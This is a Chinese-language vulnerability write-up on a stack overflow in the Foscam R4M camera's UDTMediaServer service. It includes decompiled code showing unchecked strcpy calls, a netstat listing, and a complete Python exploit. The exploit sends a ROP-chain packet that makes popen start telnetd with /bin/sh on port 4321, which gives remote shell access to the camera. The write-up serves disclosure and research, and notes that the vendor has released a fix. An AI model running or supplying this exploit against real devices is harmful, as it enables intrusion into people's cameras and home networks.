#  FOSCAM R4M WIFI 摄像头 RCE漏洞分析   
3bytes  3072   2024-07-06 10:30  
  
**「摘要」**  
  
在Foscam后台运行的二进制文件之一UDTMediaServer中存在一个基于栈的溢出漏洞。这个漏洞可能被利用来执行任何命令。  
  
**「厂商回应」**  
  
厂商已经发布了更新版本，https://www.foscam.com/downloads/firmware_details.html?id=143  
  
**「受影响版本」**  
  
运行版本V-2.x.2.67的Foscam R4M  
  
**「Root cause analysis」**  
  
首先，在解释这个漏洞之前，我们需要对代码进行一些分析。  
```
    memcpy(v11 + v10, pkt, recv_len);
    a1[sockType + 7691] += recv_len;
    v13 = 0;
    *s1 = 0;
    v14 = 0;
    v25 = 0;
    while ( 1 )
    {
      v15 = a1[sockType + 7691];
      if ( (v15 - v14) <= 0xB )
        break;
      srca = (v11 + v14);
      *s1 = *(v11 + v14 + 4);
      v21 = v15 - v14;
      if ( !strcmp(s1, "FOSC") )
      {
        v17 = srca[2] + 12;
        if ( v17 > v21 )
          break;
        v18 = v11 + v14;
        v14 += v17;
        srcb = (srca[2] + 12);
        memcpy(&unk_207950 + &a1[512 * sockType], v18, srcb);
        sub_28370(a1, fd, &unk_207950 + &a1[512 * sockType], srcb, sockType);
        ...
      }
     ...
     }

```  
  
这段代码解析了用户收到的数据包，并检查是否存在一个名为FOSC的字符串以及是否存在一个字节作为长度，如果长度确定小于0xb，循环将退出。  
  
此外，这个循环调用了sub_28370函数，该函数包含复制的数据包的内存。unk_207950是数据包的一部分，并且可以是sub_28370函数中switch语句的条件表达式：  
```
 if ( *a3 != 6 )
  {
    if ( (*(*(v13 + 4) + 8))(v14, a3 + 12) )
    {
      wirteLog(11, 1, "", "CUDTMediaServer.cpp", 2759, " DecData Error");
      return 0;
    }
    v8 = 0;
    v12 = v11;
LABEL_22:
    v15 = *a3;
    if ( *a3 == 9 )
    {
      sub_2133C(a1, a2, v12);
    }
    else if ( *a3 > 9u )
    {
      if ( v15 == 15 )
      {
        sub_21788(a1, a2, v12, v8, a5);
      }
      else if ( v15 > 0xF )
      {
        if ( v15 == 114 )
        {
          sub_256FC(a1, a2, v12, v8, a5);
        }
        else if ( v15 > 0x72 )
        {
          if ( v15 == 600 )
          {
            sub_2815C(a1, a2, v12, v8, a5);
          }
          else if ( v15 == 601 )
          {
            sub_24AEA(a1, a2, v12, v8, a5);
          }
        }
        else if ( v15 == 33 )
        {
          sub_24908(a1, a2, v12, v8, a5);
        }
        else if ( v15 == 36 )
        {
          sub_27504(a1, a2, v12, v8, a5);
        }
      }
      else if ( v15 == 11 )
      {
        sub_21414(a1, a2, v12, v8, a5);
      }
      else if ( v15 >= 0xB )
      {
        if ( v15 == 12 )
        {
          onGetInitInfo(a1, a2, v12, v8, a5); // call this
        }
        else if ( v15 == 14 )
        {
          sub_21708(a1, a2, v12, v8, a5);
        }
      }
      else
      {
        sub_213A8(a1, a2, v12, v8, a5);
      }
    }

```  
  
我们需要关注的函数是上面名为onGetInitInfo的函数。此外，a3指向数据包的内存，而v12是指向a3的指针。  
```
void __fastcall onGetInitInfo(int a1, int a2, char *pkt, int a4, int a5){
  int v8; // r3
  int v9; // r3
  int v10; // r3
  pthread_mutex_t *v11; // r10
  char *v12; // r7
  int v13; // r0
  int v14; // r2
  int v15; // r8
  char *i; // r6
  int v17; // r2
  int v18; // r1
  char v19[32]; // [sp+58h] [bp+0h] BYREF
  char v20[104]; // [sp+78h] [bp+20h] BYREF
  int v21[2]; // [sp+E0h] [bp+88h] BYREF
  char dest[32]; // [sp+E8h] [bp+90h] BYREF
  char v23[64]; // [sp+108h] [bp+B0h] BYREF
  char v24[68]; // [sp+148h] [bp+F0h] BYREF
  int v25; // [sp+18Ch] [bp+134h]
  int v26; // [sp+19Ch] [bp+144h]
  char v27[500]; // [sp+1A0h] [bp+148h] BYREF
  int v28; // [sp+394h] [bp+33Ch] BYREF
  int v29; // [sp+398h] [bp+340h]
  int v30[2]; // [sp+39Ch] [bp+344h] BYREF
  int v31; // [sp+3A4h] [bp+34Ch]
  char v32[64]; // [sp+3BCh] [bp+364h] BYREF
  char v33[68]; // [sp+3FCh] [bp+3A4h] BYREF
  int v34; // [sp+440h] [bp+3E8h]
  int v35; // [sp+444h] [bp+3ECh]
  int v36; // [sp+450h] [bp+3F8h]
  char v37[496]; // [sp+454h] [bp+3FCh] BYREF
  int v38; // [sp+644h] [bp+5ECh]

  memset(v19, 0, sizeof(v19));
  sub_22C14(a1, a2, a5, v19);
  CAesEncrypt::CAesEncrypt(v27);
  v8 = *(pkt + 32);
  v21[0] = a2;
  v25 = v8;
  v21[1] = a5;
  v26 = 0;
  sub_239A0(a1, a5, v21);
  strcpy(dest, v19);
  strcpy(v23, pkt);
  strcpy(v24, pkt + 64);
  ...
}

```  
  
上述代码只是函数的一部分。由于pkt从用户那里获取数据，而strcpy函数复制从用户那里获取的字符串，因此会发生基于栈的溢出。  
  
**「利用」**  
  
在执行利用代码之前，UDTMediaServer二进制文件在打开套接字时会随机打开一个端口。由于使用了rand()函数，有非常高的可能性会打开30000以上的端口：  
```
/tmp # netstat -anltpu
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:38611           0.0.0.0:*               LISTEN      878/UDTMediaServer
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      674/telnetd
tcp        0      0 0.0.0.0:888             0.0.0.0:*               LISTEN      2971/NVTService
tcp        0      0 0.0.0.0:88              0.0.0.0:*               LISTEN      997/lighttpd
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      997/lighttpd
tcp        0      0 0.0.0.0:65534           0.0.0.0:*               LISTEN      879/RtspServer
tcp        0    157 192.168.1.30:23         192.168.1.55:64083      ESTABLISHED 674/telnetd
tcp        0      0 127.0.0.1:34720         127.0.0.1:38155         ESTABLISHED 995/P2PProxy
tcp        0      0 192.168.1.30:55504      54.204.204.228:8884     ESTABLISHED 2978/IvyIot
tcp        0      0 127.0.0.1:38155         127.0.0.1:34720         ESTABLISHED 995/P2PProxy
udp        0      0 0.0.0.0:3702            0.0.0.0:*                           2971/NVTService
udp        0      0 0.0.0.0:10000           0.0.0.0:*                           875/devMng
udp        0      0 0.0.0.0:10001           0.0.0.0:*                           875/devMng
udp        0      0 0.0.0.0:42772           0.0.0.0:*                           878/UDTMediaServer
udp        0      0 192.168.1.30:41664      158.178.228.95:34781    ESTABLISHED 995/P2PProxy

```  
```
import socket
import struct
import sys

HOST = str(sys.argv[1])
PORT = int(sys.argv[2])


def p32(x):
    return struct.pack("<I", x)


def main():
    gadget1 = 0x3701C  # add sp, sp, #0x10c, pop {r4,r5,r6,r7,pc}
    gadget2 = 0x54C58  # mov r1, r5; pop {r4, r5, pc};
    gadget3 = 0xBDD76  # add r3, sp, #0x2bc; pop {r4, r5, pc};
    gadget4 = 0x37D0C  # mov r0, r3; pop {r4, pc};

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))

    pkt = b"\x0c\x00\x00\x00"  # ID
    pkt += b"FOSC"  # magic
    pkt += p32(0x2BC - 140)  # len
    pkt += b"A" * 132
    pkt += b"B" * 4
    pkt += p32(gadget1 + 1)
    pkt += b"D" * (0x10C - 0xE4)  # padding
    pkt += b"aaaa"
    pkt += p32(0xE2E6D)  # string 'r'
    pkt += b"cccc"
    pkt += b"dddd"
    pkt += p32(gadget2 + 1)
    pkt += b"aaaabbbb"
    pkt += p32(gadget3 + 1)
    pkt += b"aaaabbbb"
    pkt += p32(gadget4 + 1)
    pkt += b"aaaa"
    pkt += p32(0x46254 + 1)  # popen
    pkt += b"A" * (0x2BC - 20)
    pkt += b"/usr/sbin/telnetd -l /bin/sh -p 4321\x00"

    sock.sendall(pkt)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit()
    main()

```  
  
  
  
